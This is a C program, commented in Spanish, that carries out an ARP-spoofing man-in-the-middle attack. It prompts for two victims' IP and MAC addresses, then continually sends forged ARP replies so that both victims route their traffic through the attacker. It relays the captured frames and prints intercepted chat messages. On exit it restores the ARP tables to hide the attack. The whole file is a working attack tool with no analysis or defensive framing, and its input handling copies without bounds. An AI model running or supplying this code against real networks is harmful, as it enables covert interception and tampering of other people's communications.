#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <signal.h>

#define ETH_P_ARP 0x0806
#define ARPOP_REPLY 2

struct __attribute__((packed)) arp_packet {
    unsigned char eth_dest[6];
    unsigned char eth_src[6];
    unsigned short eth_proto;
    unsigned short arp_hw_type;
    unsigned short arp_proto_type;
    unsigned char arp_hw_len;
    unsigned char arp_proto_len;
    unsigned short arp_opcode;
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
};

int sock_raw;
struct sockaddr_ll device;
unsigned char MAC_ATACANTE[6], MAC_A[6], MAC_B[6];
unsigned char IP_A[4], IP_B[4];

void stringToMac(char *macStr, unsigned char *macBytes) {
    sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &macBytes[0], &macBytes[1], &macBytes[2], 
           &macBytes[3], &macBytes[4], &macBytes[5]);
}

void enviarARP(unsigned char *src_mac_eth, unsigned char *dst_mac_eth,
               unsigned char *sender_mac, unsigned char *sender_ip,
               unsigned char *target_mac, unsigned char *target_ip) {
    struct arp_packet pkt;
    memcpy(pkt.eth_dest, dst_mac_eth, 6);
    memcpy(pkt.eth_src, src_mac_eth, 6);
    pkt.eth_proto = htons(ETH_P_ARP);
    pkt.arp_hw_type = htons(1);
    pkt.arp_proto_type = htons(0x0800);
    pkt.arp_hw_len = 6;
    pkt.arp_proto_len = 4;
    pkt.arp_opcode = htons(ARPOP_REPLY);
    memcpy(pkt.sender_mac, sender_mac, 6);
    memcpy(pkt.sender_ip, sender_ip, 4);
    memcpy(pkt.target_mac, target_mac, 6);
    memcpy(pkt.target_ip, target_ip, 4);

    sendto(sock_raw, &pkt, sizeof(pkt), 0, (struct sockaddr*)&device, sizeof(device));
}

void salir_y_curar(int sig) {
    printf("\n\n[!] Saliendo... Restaurando conexión directa A <-> B.\n");
    for(int i=0; i<3; i++) {
        enviarARP(MAC_ATACANTE, MAC_A, MAC_B, IP_B, MAC_A, IP_A);
        enviarARP(MAC_ATACANTE, MAC_B, MAC_A, IP_A, MAC_B, IP_B);
        usleep(100000);
    }
    printf("[OK] Red restaurada.\n");
    close(sock_raw);
    exit(0);
}

int main() {
    system("clear");
    char buffer_in[50];
    struct ifreq nic;

    sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock_raw == -1) { perror("Error socket"); return 1; }

    printf("--- ATACANTE MITM (Entrada/Salida Dinámica) ---\n");
    printf("Interfaz: "); scanf("%s", buffer_in);

    strcpy(nic.ifr_name, buffer_in);
    ioctl(sock_raw, SIOCGIFINDEX, &nic);
    device.sll_family = AF_PACKET;
    device.sll_ifindex = nic.ifr_ifindex;
    device.sll_halen = ETH_ALEN;

    ioctl(sock_raw, SIOCGIFHWADDR, &nic);
    memcpy(MAC_ATACANTE, nic.ifr_hwaddr.sa_data, 6);

    printf("IP Víctima A: "); scanf("%s", buffer_in); inet_pton(AF_INET, buffer_in, IP_A);
    printf("MAC Víctima A: "); scanf("%s", buffer_in); stringToMac(buffer_in, MAC_A);

    printf("IP Víctima B: "); scanf("%s", buffer_in); inet_pton(AF_INET, buffer_in, IP_B);
    printf("MAC Víctima B: "); scanf("%s", buffer_in); stringToMac(buffer_in, MAC_B);

    signal(SIGINT, salir_y_curar);

    printf("\n[+] Ataque iniciado. Presiona Ctrl+C para salir invisiblemente.\n");

    pid_t pid = fork();

    if (pid == 0) {
        // --- HIJO: ENVENENAR CONSTANTEMENTE ---
        while(1) {
            enviarARP(MAC_ATACANTE, MAC_A, MAC_ATACANTE, IP_B, MAC_A, IP_A);
            enviarARP(MAC_ATACANTE, MAC_B, MAC_ATACANTE, IP_A, MAC_B, IP_B);
            sleep(2);
        }
    } else {
        // --- PADRE: REENVIAR MENSAJES ---
        unsigned char buff[2048];
        while(1) {
            memset(buff, 0, sizeof(buff));
            int tam = recvfrom(sock_raw, buff, sizeof(buff), 0, NULL, NULL);
            if (tam <= 0) continue;
            if (tam < sizeof(buff)) buff[tam] = 0;

            unsigned char *mac_dst = buff;
            unsigned char *mac_src = buff + 6;
            int es_chat = (buff[14] == 0xF0 && buff[15] == 0x0F && buff[16] == 0x7F);

            // A -> B (pasando por mí)
            if (memcmp(mac_src, MAC_A, 6) == 0 && memcmp(mac_dst, MAC_ATACANTE, 6) == 0) {
                if (es_chat) printf("[A -> B]: %s\n", buff + 17);
                memcpy(buff, MAC_B, 6);          // Poner MAC real de B
                memcpy(buff+6, MAC_ATACANTE, 6); // Poner mi MAC como origen
                sendto(sock_raw, buff, tam, 0, (struct sockaddr*)&device, sizeof(device));
            }
            // B -> A (pasando por mí)
            else if (memcmp(mac_src, MAC_B, 6) == 0 && memcmp(mac_dst, MAC_ATACANTE, 6) == 0) {
                if (es_chat) printf("[B -> A]: %s\n", buff + 17);
                memcpy(buff, MAC_A, 6);          // Poner MAC real de A
                memcpy(buff+6, MAC_ATACANTE, 6); // Poner mi MAC como origen
                sendto(sock_raw, buff, tam, 0, (struct sockaddr*)&device, sizeof(device));
            }
        }
    }
    return 0;
}